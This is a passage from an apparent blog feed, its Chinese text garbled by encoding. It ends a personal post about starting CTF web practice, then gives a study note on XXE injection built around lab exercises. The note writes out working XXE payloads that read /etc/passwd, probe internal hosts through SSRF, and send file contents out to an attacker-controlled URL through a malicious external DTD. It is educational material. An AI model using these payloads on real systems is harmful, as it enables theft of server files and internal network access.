src="https://pic1.imgdb.cn/item/67b0bc74d0e0a243d4ffb3f2.png"><br>ç›´æ¥æ‹‰æ»¡äº†ï¼Œèƒ½æ´»ä¸‹å»å—ï¼ˆ<br>æˆ‘æ˜¯è½¬ä¸“ä¸šçš„ï¼Œæ‰€ä»¥è¦è¡¥ä¸€äº›å¤§ä¸€çš„è¯¾ï¼Œè¿˜æœ‰å¥½å¤šè¯¾å’Œç°åœ¨å¤§äºŒçš„è¯¾å†²çªäº†ï¼Œæ‰€ä»¥è¦ä»£é€‰ï¼Œç„¶åä¸€èµ·ä¸Š<br>ä¸‹å­¦æœŸé™¤äº†è¯¾å¤šï¼Œè‡ªå·±è¿˜æœ‰å¥½å¤šäº‹å•Šï¼Œå¤§åˆ›ï¼Œæ¯”èµ›ã€‚ã€‚ã€‚<br>å¸Œæœ›ç¨³ç¨³è¿‡è¿™ä¸ªå­¦æœŸå§ï¼Œæˆ‘çš„å®¤å‹è¯¾æ¯”æˆ‘è¿˜å¤š<br>åé¢çš„æ¦‚ç»Ÿä¸€èŠ‚è¯¾éƒ½å»ä¸äº†ï¼Œå‡†å¤‡å¼€å­¦å‰ä¸€å¤©æŠŠæ¦‚ç»Ÿé€Ÿé€šäº†</p>
<h1 id="å¼€åˆ·ctf-web"><a href="#å¼€åˆ·ctf-web" class="headerlink" title="å¼€åˆ·ctf web"></a>å¼€åˆ·ctf web</h1><p>ctfé‡Œé¢æˆ‘æ„Ÿå…´è¶£çš„å°±æ˜¯webäº†ï¼Œæˆ‘åœ¨æ”¾å‡ä¹‹å‰å°±æœ‰å°è¯•åšä¸€äº›webé¢˜ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œä¸€èˆ¬å°±æ˜¯çœ‹wpæ‰çŸ¥é“æ€ä¹ˆåš<br>å¿«å¼€å­¦äº†ï¼Œä¹Ÿå»åˆ·åˆ·äº†webè¸¢ï¼Œä¸è¿‡æœ‰äº†æ‰“é¶æœºç»éªŒï¼Œåšèµ·æ¥è¿˜æ˜¯ä¸ä¸€æ ·çš„ï¼Œè™½ç„¶è¿˜æ˜¯è‡ªå·±åšä¸å‡ºæ¥ï¼Œä½†æ˜¯çœ‹wpèƒ½çœ‹çš„æ›´æ‡‚äº†<br>æˆ‘å…ˆå»ctfshowé‡Œé¢çš„webéƒ¨åˆ†åšäº†æœ€å¼€å§‹çš„é‚£å—ï¼Œä½†æ˜¯è¿™é‡Œå‰é¢è¿˜æ˜¯æœ‰ç‚¹å–„è‰¯ï¼Œåé¢åŸºæœ¬éƒ½æ˜¯ä»£ç å®¡è®¡çš„ï¼Œä¸é€‚åˆæ–°æ‰‹<br><img src="https://pic1.imgdb.cn/item/67b0bdc4d0e0a243d4ffb41f.png"><br>å‰é¢åšçš„æ—¶å€™éƒ½æœ‰æ•´ç†ï¼Œæ‰€ä»¥çœ‹åˆ°åé¢é‚£ä¹ˆexçš„é¢˜ç›®è¿˜æ˜¯ç¡¬ç€å¤´çš®æŠŠç½‘ä¸Šæœåˆ°çš„wpæ•´ç†äº†ä¸€ä¸‹ç„¶åä¸Šä¼ ä¸Šå»äº†<br>åé¢åšnssctfé‡Œé¢çš„swpuctfæ–°ç”Ÿèµ›çš„é¢˜ç›®äº†ï¼Œè¿™ä¸ªé¢˜ç›®è¿˜æ˜¯ç‰¹åˆ«å¥½çš„ï¼Œé€‚åˆæ–°æ‰‹ï¼Œè´¨é‡ä¹Ÿé«˜<br><img src="https://pic1.imgdb.cn/item/67b0be12d0e0a243d4ffb426.png"><br>è¿™é‡Œæˆ‘ä¹‹å‰å¤§æ¦‚å°±åšäº†åé¢˜å·¦å³ï¼Œç„¶åæˆ‘è‡ªå·±å†é‡æ–°å¼€å§‹åšï¼Œç„¶åè¾¹åšè¾¹å†™wpï¼Œç°åœ¨åšå’Œä»¥å‰åšçš„æ„Ÿè§‰å®Œå…¨ä¸ä¸€æ ·ï¼Œç°åœ¨ä¼šåšäº†è€Œä¸”æ€è·¯ä¹Ÿæ¸…æ™°ï¼Œä¹Ÿèƒ½å­¦åˆ°ä¸å°‘ã€‚<br>æ‰€ä»¥ç›´æ¥å°±å¼€å¹²å§ï¼Œåªè¦ä½ æœ‰ä¸€å°ç”µè„‘ è£…ä¸€ä¸ªkaliç›´æ¥å¹²ï¼Œç¢°åˆ°ä»€ä¹ˆå­¦ä»€ä¹ˆï¼Œçœ‹wpç”¨ä»€ä¹ˆå·¥å…·å°±ä¸‹ä»€ä¹ˆã€‚åŸºæœ¬å¸¸ç”¨çš„ä¹Ÿå°±èšå‰‘ï¼Œbpä¹Ÿæ²¡å•¥ç‰¹åˆ«çš„ã€‚<br>å¸Œæœ›è‡ªå·±åœ¨ç½‘å®‰è¿™æ¡é“è·¯ä¸Šæ…¢æ…¢åŠ æ²¹äº†ï¼Œä¸çŸ¥é“å¼€å­¦ä¹‹åè¿˜æœ‰å¤šå°‘æ—¶é—´å”‰</p>
]]></content>
      <categories>
        <category>ç”Ÿæ´»</category>
      </categories>
      <tags>
        <tag>ç”Ÿæ´»</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ¼æ´å­¦ä¹ ç¬”è®°</title>
    <url>/posts/11248.html</url>
    <content><![CDATA[<p>XML external entity (XXE) injectionå­¦ä¹ ç¬”è®°</p>
<span id="more"></span>
<p>æœ€è¿‘åˆ·é¢˜çš„æ—¶å€™ç¢°åˆ°äº†xxeæ¼æ´ï¼Œæˆ‘ä¹‹å‰æ²¡äº†è§£è¿‡ï¼Œç°åœ¨å°±ç”¨bpçš„å®éªŒå®¤æ¥å­¦ä¹ è¿™ä¸ªæ¼æ´å§ï¼Œå†™ä¸ªç¬”è®°è®°å½•ä¸€ä¸‹ã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯XML-XMLå®ä½“-DTD"><a href="#ä»€ä¹ˆæ˜¯XML-XMLå®ä½“-DTD" class="headerlink" title="ä»€ä¹ˆæ˜¯XML XMLå®ä½“ DTD?"></a>ä»€ä¹ˆæ˜¯XML XMLå®ä½“ DTD?</h2><p>XML ä»£è¡¨ â€œå¯æ‰©å±•æ ‡è®°è¯­è¨€â€ã€‚XML æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„è¯­è¨€ã€‚å’Œhtmlä¸€æ ·ä½¿ç”¨æ ‡ç­¾ï¼Œä½†æ˜¯xmlå¯ä»¥ç”¨è‡ªå®šä¹‰çš„æ ‡ç­¾ã€‚</p>
<p>XML å®ä½“æ˜¯ä¸€ç§åœ¨ XML æ–‡æ¡£ä¸­è¡¨ç¤ºæ•°æ®é¡¹çš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ•°æ®æœ¬èº«ã€‚XML è¯­è¨€è§„èŒƒä¸­å†…ç½®äº†å„ç§å®ä½“ã€‚ä¾‹å¦‚ï¼Œå®ä½“ &lt; å’Œ &gt; è¡¨ç¤ºå­—ç¬¦ &lt; å’Œ &gt; ã€‚è¿™äº›æ˜¯ç”¨äºè¡¨ç¤º XML æ ‡ç­¾çš„å…ƒå­—ç¬¦ï¼Œå› æ­¤å½“å®ƒä»¬å‡ºç°åœ¨æ•°æ®ä¸­æ—¶ï¼Œé€šå¸¸å¿…é¡»ä½¿ç”¨å…¶å®ä½“æ¥è¡¨ç¤ºã€‚</p>
<p>XML æ–‡æ¡£ç±»å‹å®šä¹‰ (DTD) åŒ…å«å£°æ˜ï¼Œè¿™äº›å£°æ˜å¯ä»¥å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„ã€æ–‡æ¡£ä¸­å¯ä»¥åŒ…å«çš„æ•°æ®å€¼ç±»å‹ä»¥åŠå…¶ä»–é¡¹ç›®ã€‚DTD åœ¨ XML æ–‡æ¡£å¼€å¤´çš„å¯é€‰ DOCTYPE å…ƒç´ ä¸­å£°æ˜ã€‚DTD å¯ä»¥å®Œå…¨åŒ…å«åœ¨æ–‡æ¡£æœ¬èº«ä¸­ï¼ˆç§°ä¸º â€œå†…éƒ¨ DTDâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥ä»å…¶ä»–åœ°æ–¹åŠ è½½ï¼ˆç§°ä¸º â€œå¤–éƒ¨ DTDâ€ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸¤è€…çš„æ··åˆã€‚<br>DTDå¯ä»¥ç±»æ¯”htmlä¸­çš„cssï¼Œä¸ºäº†è®©xmlçš„æ ¼å¼ç»Ÿä¸€ï¼Œä¾¿äºä¼ è¾“</p>
<p><strong>XMLè‡ªå®šä¹‰å®ä½“</strong>ï¼š<br>XML å…è®¸åœ¨ DTD ä¸­å®šä¹‰è‡ªå®šä¹‰å®ä½“ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">myentity</span> <span class="string">&quot;my entity value&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ­¤å®šä¹‰æ„å‘³ç€ XML æ–‡æ¡£ä¸­ä»»ä½•å¯¹å®ä½“å¼•ç”¨ &myentity; çš„ä½¿ç”¨éƒ½å°†è¢«æ›¿æ¢ä¸ºå®šä¹‰çš„å€¼ï¼šâ€œ my entity value â€ã€‚</p>
<p><strong>XMLå¤–éƒ¨å®ä½“</strong>ï¼š<br>XML å¤–éƒ¨å®ä½“æ˜¯ä¸€ç§è‡ªå®šä¹‰å®ä½“ï¼Œå…¶å®šä¹‰ä½äºå£°æ˜å®ƒä»¬çš„ DTD ä¹‹å¤–ã€‚<br>å¤–éƒ¨å®ä½“çš„å£°æ˜ä½¿ç”¨ SYSTEM å…³é”®å­—ï¼Œå¹¶ä¸”å¿…é¡»æŒ‡å®šåº”ä»ä¸­åŠ è½½å®ä½“å€¼çš„ URLã€‚URLä¹Ÿå¯ä»¥ç”¨phpä¼ªåè®®ï¼Œfileåè®®ç­‰ç­‰,å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">ext</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///path/to/file&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="ä»€ä¹ˆæ˜¯xxeæ¼æ´-å¦‚ä½•å‡ºç°"><a href="#ä»€ä¹ˆæ˜¯xxeæ¼æ´-å¦‚ä½•å‡ºç°" class="headerlink" title="ä»€ä¹ˆæ˜¯xxeæ¼æ´ å¦‚ä½•å‡ºç°"></a>ä»€ä¹ˆæ˜¯xxeæ¼æ´ å¦‚ä½•å‡ºç°</h2><p>å…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºå¯¹ XML æ•°æ®çš„å¤„ç†ã€‚å®ƒé€šå¸¸å…è®¸æ”»å‡»è€…åœ¨åº”ç”¨ç¨‹åºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸ŠæŸ¥çœ‹æ–‡ä»¶ï¼Œå¹¶ä¸åº”ç”¨ç¨‹åºæœ¬èº«å¯ä»¥è®¿é—®çš„ä»»ä½•åç«¯æˆ–å¤–éƒ¨ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</p>
<p>ä¸€äº›åº”ç”¨ç¨‹åºä½¿ç”¨ XML æ ¼å¼åœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚è¿™æ ·åšçš„åº”ç”¨ç¨‹åºå®é™…ä¸Šå§‹ç»ˆä½¿ç”¨æ ‡å‡†åº“æˆ–å¹³å° API æ¥å¤„ç†æœåŠ¡å™¨ä¸Šçš„ XML æ•°æ®ã€‚ XXE æ¼æ´ä¹‹æ‰€ä»¥å‡ºç°ï¼Œæ˜¯å› ä¸º XML è§„èŒƒåŒ…å«å„ç§æ½œåœ¨å±é™©çš„åŠŸèƒ½ï¼Œå¹¶ä¸”æ ‡å‡†è§£æå™¨ä¹Ÿæ”¯æŒè¿™äº›åŠŸèƒ½ï¼Œå³ä½¿åº”ç”¨ç¨‹åºé€šå¸¸ä¸ä½¿ç”¨å®ƒä»¬ã€‚<br>ä¸Šé¢ä¹Ÿæœ‰è¯´åˆ°xmlçš„å¤–éƒ¨å®ä½“å¯ä»¥è¿è¡Œå…¶ä»–çš„åè®®ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œåœ¨ä¸€äº›æƒ…å†µè¿˜ä¼šå‡ºç°ssrf(æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</p>
<h2 id="xxeæ”»å‡»ç±»å‹"><a href="#xxeæ”»å‡»ç±»å‹" class="headerlink" title="xxeæ”»å‡»ç±»å‹"></a>xxeæ”»å‡»ç±»å‹</h2><h3 id="åˆ©ç”¨-xxe-æ£€ç´¢æ–‡ä»¶"><a href="#åˆ©ç”¨-xxe-æ£€ç´¢æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ xxe æ£€ç´¢æ–‡ä»¶"></a>åˆ©ç”¨ xxe æ£€ç´¢æ–‡ä»¶</h3><p>è¿™ç§æ”»å‡»éœ€è¦ä¸¤æ­¥æäº¤xml<br>1 åˆ›å»ºä¸€ä¸ªDOCTYPE ç„¶åå®šä¹‰ä¸€ä¸ªå®ä½“<br>2 å‘é€æ•°æ®è¯·æ±‚ï¼Œå¼•ç”¨åˆ°è¿™ä¸ªå®ä½“<br>æ¯”å¦‚è´­ç‰©ç”³è¯·é€šè¿‡å°†ä»¥ä¸‹ XML æäº¤åˆ°æœåŠ¡å™¨ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>381<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å› ä¸ºæœåŠ¡å™¨æ²¡æœ‰xxeçš„é˜²å¾¡æªæ–½ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·åˆ©ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·å­å‘é€æ•°æ®åï¼Œç³»ç»Ÿå°±å›è¯»å–åˆ°&#x2F;etc&#x2F;passwdä¸­çš„æ–‡ä»¶ï¼Œç„¶åè¿”å›ç»™æˆ‘ä»¬<br><img src="https://pic1.imgdb.cn/item/67c087d9d0e0a243d407528c.png"></p>
<h3 id="åˆ©ç”¨-xxe-æ‰§è¡ŒSSRF"><a href="#åˆ©ç”¨-xxe-æ‰§è¡ŒSSRF" class="headerlink" title="åˆ©ç”¨ xxe æ‰§è¡ŒSSRF"></a>åˆ©ç”¨ xxe æ‰§è¡ŒSSRF</h3><p>è¿™ä¼šè®©ç¨‹åºçš„æœåŠ¡å™¨è®¿é—®ä»»æ„çš„URLæå‡ºHTTPè¯·æ±‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c08c33d0e0a243d40754a0.png"><br>æ¯”å¦‚è¿™é‡Œssrfæ”»å‡»ï¼Œè®¿é—®å†…éƒ¨èµ„æºï¼Œç„¶åæ ¹æ®è¿”å›å¾—åˆ°ä¸€ä¸ªidï¼Œç„¶åå¯ä»¥æ ¹æ®è¿™äº›æ•æ„Ÿä¿¡æ¯ç»§ç»­å¾—åˆ°ä¸€äº›ä¿¡æ¯</p>
<h3 id="ç›²xxe"><a href="#ç›²xxe" class="headerlink" title="ç›²xxe"></a>ç›²xxe</h3><p>å¾ˆå¤šxxeæ¼æ´æ˜¯ä¸ä¼šåœ¨å“åº”ä¸­è¿”å›å®šä¹‰çš„å¤–éƒ¨å®ä½“ï¼Œä½†æ˜¯å¯ä»¥è§¦å‘xmlè§£æé”™è¯¯æˆ–è€…å’Œå¤–éƒ¨çš„ç½‘ç»œäº¤äº’ï¼Œä»è€Œå¯¼è‡´æ•æ„Ÿæ•°æ®æ³„æ¼</p>
<p>1 è®©å¤–éƒ¨å®ä½“è®¿é—®æ”»å‡»è€…è®¾ç½®çš„urlï¼Œè¿™æ ·åœ¨æ”»å‡»æœºä¸Šå¯ä»¥ç›‘å¬httpè¯·æ±‚ï¼Œä»è€Œç¡®å®šæ”»å‡»æ˜¯å¦æˆåŠŸï¼Œå¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æœ‰æ—¶ç¨‹åºä¼šåŠ å¼ºè§£æå™¨ï¼Œä¸€èˆ¬çš„xmlå®ä½“æ”»å‡»ä¼šè¢«é˜»æ­¢ï¼Œè¿™æ—¶å€™å°±è¦ç”¨XML å‚æ•°å®ä½“ã€‚ XML å‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„ XML å®ä½“ï¼Œåªèƒ½åœ¨ DTD ä¸­çš„å…¶ä»–åœ°æ–¹å¼•ç”¨ã€‚<br>é¦–å…ˆï¼ŒXML å‚æ•°å®ä½“çš„å£°æ˜åœ¨å®ä½“åç§°å‰åŒ…å«ç™¾åˆ†å·ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">myparameterentity</span> <span class="string">&quot;my parameter entity value&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å…¶æ¬¡ï¼Œä½¿ç”¨ç™¾åˆ†å·è€Œä¸æ˜¯é€šå¸¸çš„ â€œä¸â€ ç¬¦å·æ¥å¼•ç”¨å‚æ•°å®ä½“ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HAML"><figure class="iseeu highlight /haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">myparameterentity</span></span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://f2g9j7hhkax.web-attacker.com&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67c11592d0e0a243d4078a52.png"><br>è¦æ³¨æ„xmlå‚æ•°å®ä½“å’Œæ™®é€šå®ä½“çš„åŒºåˆ«ï¼Œå¤šäº†ä¸ª% è€Œä¸”åœ¨æœ€åè¦åœ¨DOCTYPEé‡Œé¢å¼•ç”¨ã€‚</p>
<h4 id="åˆ©ç”¨ç›²xxeè®¿é—®æ•æ„Ÿæ•°æ®"><a href="#åˆ©ç”¨ç›²xxeè®¿é—®æ•æ„Ÿæ•°æ®" class="headerlink" title="åˆ©ç”¨ç›²xxeè®¿é—®æ•æ„Ÿæ•°æ®"></a>åˆ©ç”¨ç›²xxeè®¿é—®æ•æ„Ÿæ•°æ®</h4><p>ä¸Šé¢çŸ¥è¯†è¯´äº†ä»€ä¹ˆæ˜¯ç›²xxeï¼Œå…·ä½“åº”è¯¥å¦‚ä½•ä½¿ç”¨å®ƒå‘¢ã€‚<br>å®ƒéœ€è¦æ”»å‡»è€…åœ¨ä»–ä»¬æ§åˆ¶çš„ç³»ç»Ÿä¸Šæ‰˜ç®¡æ¶æ„ DTDï¼Œç„¶åä»å¸¦å†… XXE è´Ÿè½½ä¸­è°ƒç”¨å¤–éƒ¨ DTDã€‚</p>
<p>ç”¨äºçªƒå– &#x2F;etc&#x2F;passwd æ–‡ä»¶å†…å®¹çš„æ¶æ„ DTD ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://web-attacker.com/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%eval</span>;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%exfiltrate</span>;</span></span><br></pre></td></tr></table></figure></div>
<p>å®šä¹‰ä¸€ä¸ªåä¸º file çš„ XML å‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å« &#x2F;etc&#x2F;passwd æ–‡ä»¶çš„å†…å®¹ã€‚<br>ç„¶ååˆå®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨å®ä½“eval åŒ…å«äº†å¦ä¸€ä¸ªexfiltrateå®ä½“çš„å†…å®¹ï¼Œ<code>&amp;#x25;</code>æ˜¯ç™¾åˆ†å·ï¼Œç”±äº % åœ¨å®ä½“å®šä¹‰ä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨è¿™ç§è½¬ä¹‰æ–¹å¼æ¥è¡¨ç¤ºæ™®é€šçš„ç™¾åˆ†å·ã€‚<br>æœ€åç”¨<code>%eval</code>æ¥è°ƒç”¨è¿™ä¸ªå®ä½“ï¼Œå½“è§£æå™¨é‡åˆ°è¿™è¡Œä»£ç çš„æ—¶å€™ï¼Œä¼šæ’å…¥è¿™ä¸ªå®ä½“å®šä¹‰çš„å†…å®¹<br>notes</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">æ­¤æŠ€æœ¯å¯èƒ½ä¸é€‚ç”¨äºæŸäº›æ–‡ä»¶å†…å®¹ï¼ŒåŒ…æ‹¬ /etc/passwd æ–‡ä»¶ä¸­çš„æ¢è¡Œç¬¦ã€‚è¿™æ˜¯å› ä¸ºæŸäº› <span class="keyword">XML</span> <span class="title">è§£æå™¨ä½¿ç”¨ API</span> è·å–å¤–éƒ¨å®ä½“å®šä¹‰ä¸­çš„ URLï¼Œè¯¥ API ä¼šéªŒè¯ URL ä¸­å…è®¸å‡ºç°çš„å­—ç¬¦ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ FTP åè®®è€Œä¸æ˜¯ HTTPã€‚æœ‰æ—¶ï¼Œæ— æ³•çªƒå–åŒ…å«æ¢è¡Œç¬¦çš„æ•°æ®ï¼Œå› æ­¤å¯ä»¥æ”¹ä¸ºé’ˆå¯¹ /etc/hostname ç­‰æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ç¤ºä¾‹<br><img src="https://pic1.imgdb.cn/item/67c11fc8d0e0a243d4079e0c.png"><br>åœ¨æœåŠ¡å™¨ä¸Šå…ˆå†™å…¥æ¶æ„dtdæ–‡ä»¶<br>ç„¶åç”¨å†…éƒ¨å®ä½“ç»™æœåŠ¡å™¨çš„æ¶æ„dtdåœ°å€å‘é€è¯·æ±‚ï¼Œ<br><img src="https://pic1.imgdb.cn/item/67c11fd8d0e0a243d4079e4e.png"><br>å°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šçš„accesslogä¸Šé¢çœ‹åˆ°hostnameäº†<br><img src="https://pic1.imgdb.cn/item/67c11ff7d0e0a243d4079eb0.png"></p>
<p>è¯´å®Œäº†ç”¨å¤–éƒ¨æœåŠ¡å™¨åˆ©ç”¨ç›²xxeï¼Œç°åœ¨å†æ¥çœ‹çœ‹ç”¨æŠ¥é”™åˆ©ç”¨xxe</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%eval</span>;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl"><span class="variable">%error</span>;</span></span><br></pre></td></tr></table></figure></div>
<p>æ€»ä½“çš„ç»“æ„å’Œåˆšæ‰å¾ˆåƒï¼Œè¿™é‡Œæ˜¯é€šè¿‡è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè®©xmlæŠ¥é”™ï¼Œè¿™ä¸ªåç§°å°±æ˜¯<code>%file</code>çš„å†…å®¹äº†<br>ä¹Ÿæ˜¯ç°åœ¨æœåŠ¡å™¨ä¸Šå…ˆæ”¾ä¸Šè¿™ä¸ªæ¶æ„dtdæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67c12110d0e0a243d407a193.png"><br>å½“æˆ‘ä»¬å»è®¿é—®æˆ‘ä»¬æœåŠ¡å™¨ä¸Šçš„è¿™ä¸ªdtdæ–‡ä»¶çš„æ—¶å€™ï¼Œå› ä¸ºæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶åœ°å€ï¼Œæ‰€ä»¥æœ‰æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œå°±èƒ½å¾—åˆ°&#x2F;etc&#x2F;passwdäº†<br><img src="https://pic1.imgdb.cn/item/67c12181d0e0a243d407a2ae.png"></p>
